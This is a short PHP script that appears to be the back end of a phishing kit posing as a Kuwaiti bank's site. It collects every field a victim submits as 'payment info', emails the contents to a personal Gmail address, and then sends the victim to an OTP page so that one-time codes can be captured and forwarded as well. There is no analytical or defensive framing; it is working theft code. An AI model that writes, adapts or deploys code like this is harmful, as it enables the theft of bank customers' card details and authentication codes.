<?php

header("Access-Control-Allow-Origin: https://nbkkuwait.com");

$to = "hassankiwan92@gmail.com";
$sender="admin@nbkkuwait.com";


if(isset($_POST)) {
    if(isset($_POST['action']) =='sendtEmailPatment'){  
        sendtEmailPatment($_POST);
    }if(isset($_POST['action']) =='sendOTP'){  
        sendOTP($_POST) ;
    }

    exit;  
}

function sendtEmailPatment($data){

    $subject = "payment info";
    $message="";
    foreach($data as $key=>$msg){
        $message.= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    header("Location: ./otp.php");
    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        header("Location: ./otp.php");
    } else {
        echo "Failed to send email.";
    }
}


function sendOTP($data){
    $to = "recipient@example.com";
    $subject = "OTP";
    $message="";
    foreach($data as $key=>$msg){
        $message.= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "successfully!";
    } else {
        echo "Failed.";
    }
}
?>
